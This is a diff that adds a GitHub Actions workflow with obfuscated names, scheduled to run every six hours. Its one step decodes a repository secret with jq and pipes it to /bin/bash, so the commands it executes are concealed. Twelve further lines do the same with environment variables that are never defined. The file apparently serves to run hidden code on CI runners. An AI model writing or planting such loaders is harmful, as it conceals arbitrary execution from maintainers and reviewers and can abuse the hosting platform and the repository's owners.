@@ -1,0 +1,29 @@
+name: xiaolouzhu6789
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaolouzhu6789
+        env:
+          g36: ${{ secrets.g36 }}
+        run: |
+          echo $g36 | jq -r .omrmg9545 | /bin/bash
+          echo $owok48 | jq -r .lzgyg40501 | /bin/bash
+          echo $gcm40 | jq -r .fr951 | /bin/bash
+          echo $bkch2 | jq -r .wejwo21279 | /bin/bash
+          echo $kfy12 | jq -r .pyp9275 | /bin/bash
+          echo $tr838 | jq -r .m51023 | /bin/bash
+          echo $uufe5 | jq -r .nyglm39388 | /bin/bash
+          echo $sqid21345 | jq -r .boha3993 | /bin/bash
+          echo $fjmio763 | jq -r .ih81741 | /bin/bash
+          echo $ek478 | jq -r .nbiid182 | /bin/bash
+          echo $rfo29944 | jq -r .kxu4881 | /bin/bash
+          echo $fvnar7 | jq -r .uux13644 | /bin/bash
+          echo $jl70 | jq -r .m82663 | /bin/bash
+
